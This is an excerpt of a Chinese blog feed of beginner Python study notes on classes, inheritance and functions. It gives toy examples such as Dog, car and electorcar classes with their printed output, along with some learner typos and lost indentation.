class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    def sit(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; is now sitting &quot;)</span><br><span class="line"></span><br><span class="line">    def roll_over(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; rolled over&quot;)</span><br><span class="line"></span><br><span class="line">my_dog = Dog(&quot;willie&quot;,6)</span><br><span class="line">your_dog = Dog(&quot;annn&quot;,2)</span><br><span class="line">print(f&quot;my dog&#x27;s name is  &#123;my_dog.name&#125;&quot;)</span><br><span class="line">print(f&quot;my dog&#x27;s age is &#123;my_dog.age&#125;&quot;)</span><br><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br><span class="line"></span><br><span class="line">print(f&quot;your dog&#x27;s name is &#123;your_dog.name&#125;&quot;)</span><br><span class="line">your_dog.sit()</span><br><span class="line">print(f&quot;your dog can roll over,&#123;your_dog.name&#125;,how old is your dog &#123;your_dog.age&#125;&quot;)</span><br><span class="line">your_dog.roll_over()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my dog&#x27;s name is  willie</span><br><span class="line">my dog&#x27;s age is 6</span><br><span class="line">willie is now sitting </span><br><span class="line">willie rolled over</span><br><span class="line">your dog&#x27;s name is annn</span><br><span class="line">annn is now sitting </span><br><span class="line">your dog can roll over,annn,how old is your dog 2</span><br><span class="line">annn rolled over</span><br></pre></td></tr></table></figure><h5 id="使用类和实例"><a href="#使用类和实例" class="headerlink" title="使用类和实例"></a>使用类和实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br></pre></td></tr></table></figure><h6 id="给属性指定默认值"><a href="#给属性指定默认值" class="headerlink" title="给属性指定默认值"></a>给属性指定默认值</h6><p>创建实例时，有些属性无需通过形参来定义，可以再方法”<em>init</em>()”中为其指定默认值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading=0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 0 mile on it</span><br></pre></td></tr></table></figure><h5 id="修改属性的值"><a href="#修改属性的值" class="headerlink" title="修改属性的值"></a>修改属性的值</h5><h6 id="直接修改"><a href="#直接修改" class="headerlink" title="直接修改"></a>直接修改</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading=0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line">    </span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.odometer_reading = 23</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 23 mile on it</span><br></pre></td></tr></table></figure><h6 id="通过方法修改属性的值"><a href="#通过方法修改属性的值" class="headerlink" title="通过方法修改属性的值"></a>通过方法修改属性的值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading=0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self,milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.undate_odometer(23)</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 23 mile on it</span><br></pre></td></tr></table></figure><h6 id="通过方法对属性的值进行递增"><a href="#通过方法对属性的值进行递增" class="headerlink" title="通过方法对属性的值进行递增"></a>通过方法对属性的值进行递增</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;, &#x27;a4&#x27;, &#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.undate_odometer(666)</span><br><span class="line">my_new_car.read_odometer()</span><br><span class="line"></span><br><span class="line">my_new_car.increaing_odometer(1000)</span><br><span class="line">print(my_new_car.read_odometer())</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 666 mile on it</span><br><span class="line">this car has 1666 mile on it</span><br><span class="line">None</span><br></pre></td></tr></table></figure><p>？这个none是怎么蹦出来的？</p><h6 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h6><p>子类的方法_init_</p><p>在既有类的基础上编写新的类的时候，通常会调用父类的方法_inti_。浙江初始化在父类_init_（）方法来定义的所有属性，从而让子类包含这些属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">class electorcar(car):</span><br><span class="line">    def _init_(self,make,model,year):</span><br><span class="line">        super()._init_(maek,model.year)</span><br><span class="line"></span><br><span class="line">my_tesia = electorcar(&#x27;tesla&#x27;,&#x27;model s&#x27;,&#x27;2020&#x27;)</span><br><span class="line">print(my_tesia.get_descript_name())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020  Model S  Tesla</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里super()是一个特殊函数，使得你可以调用弗雷德方法。这一行代码能够使得python调用car类的方法_init_，让electorcar实例能够包含这个方法的所有属性。父类也称之为超类。</p><h6 id="给子类定义属性和方法"><a href="#给子类定义属性和方法" class="headerlink" title="给子类定义属性和方法"></a>给子类定义属性和方法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print, super</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">class electorcar(car):</span><br><span class="line">    def __init__(self,make,model,year):</span><br><span class="line">        super().__init__(make,model,year)</span><br><span class="line">        self.battery_size = 75</span><br><span class="line"></span><br><span class="line">    def describe_battery(self):</span><br><span class="line">        print(f&quot;this car has a &#123;self.battery_size&#125; - km battery&quot;)</span><br><span class="line"></span><br><span class="line">my_tesla = electorcar(&#x27;tesla&#x27;,&#x27;model s&#x27;,2020)</span><br><span class="line">print(my_tesla.get_descript_name())</span><br><span class="line">my_tesla.describe_battery()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020  Model S  Tesla</span><br><span class="line">this car has a 75 - km battery</span><br></pre></td></tr></table></figure><h6 id="重写父类的方法"><a href="#重写父类的方法" class="headerlink" title="重写父类的方法"></a>重写父类的方法</h6><p>对于父类的方法重写，可以在子类中定义一个与要冲写的父类方法同名的方法。</p><h6 id="将实例当做属性"><a href="#将实例当做属性" class="headerlink" title="将实例当做属性"></a>将实例当做属性</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print, super</span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line"></span><br><span class="line">class Battery:</span><br><span class="line">    def __init__(self,battery_size=75):</span><br><span class="line">        self.battery_size = battery_size</span><br><span class="line">    def describe_battery(self):</span><br><span class="line">        print(f&quot;this car has a &#123;self.battery_size&#125;-kwh battery.&quot;)</span><br><span class="line"></span><br><span class="line">class electorcar(car):</span><br><span class="line">    def __init__(self,make,model,year):</span><br><span class="line">        super().__init__(make, model,year)</span><br><span class="line">        self.battery= Battery()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_tesla = electorcar(&#x27;tesla&#x27;,&#x27;model s&#x27;,2020)</span><br><span class="line">print(my_tesla.get_descript_name())</span><br><span class="line">my_tesla.battery.describe_battery()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020  Model S  Tesla</span><br><span class="line">this car has a 75-kwh battery.</span><br></pre></td></tr></table></figure><h6 id="导入类"><a href="#导入类" class="headerlink" title="导入类"></a>导入类</h6><p>导入所有类的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from  ()   import *</span><br></pre></td></tr></table></figure><p>使用别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from () import ()  as ()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyhton--从入门到入土---函数</title>
      <link href="/2023/03/27/Pyhton--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%87%BD%E6%95%B0/"/>
      <url>/2023/03/27/Pyhton--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>函数</p><h6 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h6><p>开头使用关键字def定义函数，中间添加需要定义的函数的名字，结尾部分别忘了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def greet_user():</span><br><span class="line">print(&quot;Hello a&quot;)</span><br><span class="line">greet_user()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello a</span><br></pre></td></tr></table></figure><h6 id="向函数中传递信息"><a href="#向函数中传递信息" class="headerlink" title="向函数中传递信息"></a>向函数中传递信息</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def greet_user(user_name):</span><br><span class="line">&quot;&quot;&quot;表示最简单的问候&quot;&quot;&quot;</span><br><span class="line">print(f&quot;Hello a,&#123;user_name.title()&#125;&quot;)</span><br><span class="line">greet_user(&#x27;jess&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello a,Jess</span><br></pre></td></tr></table></figure><p>传递实参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def describe_pet(animal_type,pet_name):</span><br><span class="line">   print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">   print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line">describe_pet(&#x27;dog&#x27;,&#x27;king&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i have a dog</span><br><span class="line">my dog&#x27;s name is king.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里将实参dog赋给形参animal_type，而实参king被赋给pet_name，这种基于实参的位置顺序的关联方式称之为位置实参</p><h6 id="多次调用函数"><a href="#多次调用函数" class="headerlink" title="多次调用函数"></a>多次调用函数</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def describe_pet(animal_type,pet_name):</span><br><span class="line">print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line">describe_pet(&#x27;小黑子&#x27;,&#x27;真下头&#x27;)</span><br><span class="line">describe_pet(&#x27;汪汪队&#x27;,&#x27;立大功&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i have a 小黑子</span><br><span class="line">my 小黑子&#x27;s name is 真下头.</span><br><span class="line">i have a 汪汪队</span><br><span class="line">my 汪汪队&#x27;s name is 立大功.</span><br></pre></td></tr></table></figure><h6 id="关键字实参"><a href="#关键字实参" class="headerlink" title="关键字实参"></a>关键字实参</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def describe_pet(animal_type, pet_name):</span><br><span class="line">    print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">    print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">describe_pet(animal_type=&#x27;小黑子&#x27;, pet_name=&#x27;真下头&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i have a 小黑子</span><br><span class="line">my 小黑子&#x27;s name is 真下头.</span><br></pre></td></tr></table></figure><p>关键字实参的顺序无所谓，但是需要准确制定函数定义中的形参名</p><h6 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h6><p>编写函数式，可以给每个形参指定默认值，在调用函数中都给形参提供实参时，Python将使用指定的实参值，否则将会使用形参的默认值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def describe_pet(pet_name,animal_type=&#x27;dog&#x27;):</span><br><span class="line">    print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">    print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">describe_pet(pet_name=&#x27;汪汪队立大功&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i have a dog</span><br><span class="line">my dog&#x27;s name is 汪汪队立大功.</span><br></pre></td></tr></table></figure><h6 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h6><p>·函数并非是直接显示输出，它还可以处理一些数据，并返回一个或者一组值。函数返回的值称之为返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(first_name,last_name):</span><br><span class="line">full_name=f&quot;&#123;first_name&#125;  &#123;last_name&#125;&quot;</span><br><span class="line">return full_name.title()</span><br><span class="line">musician = name(&#x27;a&#x27;,&#x27;hahaha&#x27;)</span><br><span class="line">print(musician)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A  Hahaha</span><br></pre></td></tr></table></figure><p>这里的返回值是full.name转换成首字母大写形式</p><h6 id="让实参变成可选的"><a href="#让实参变成可选的" class="headerlink" title="让实参变成可选的"></a>让实参变成可选的</h6><p>可以使用默认值是实参变成可选的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(first_name,last_name,middle_name=&#x27;&#x27;):</span><br><span class="line">if middle_name:</span><br><span class="line">full_name=f&quot;&#123;first_name&#125; &#123;middle_name&#125; &#123;last_name&#125;&quot;</span><br><span class="line">else:</span><br><span class="line">full_name=f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</span><br><span class="line"></span><br><span class="line">return full_name.title()</span><br><span class="line">musician = name(&#x27;a&#x27;,&#x27;hahaha&#x27;)</span><br><span class="line">print(musician)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A Hahaha</span><br></pre></td></tr></table></figure><h6 id="返回字典"><a href="#返回字典" class="headerlink" title="返回字典"></a>返回字典</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">def name_in(first_name,last_name):</span><br><span class="line">person = &#123;&#x27;ffirst&#x27;:first_name,&#x27;last&#x27;:last_name&#125;</span><br><span class="line">return person</span><br><span class="line">musician = name_in(&#x27;奥拓&#x27;,&#x27;阿波卡利斯&#x27;)</span><br><span class="line">print(musician)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 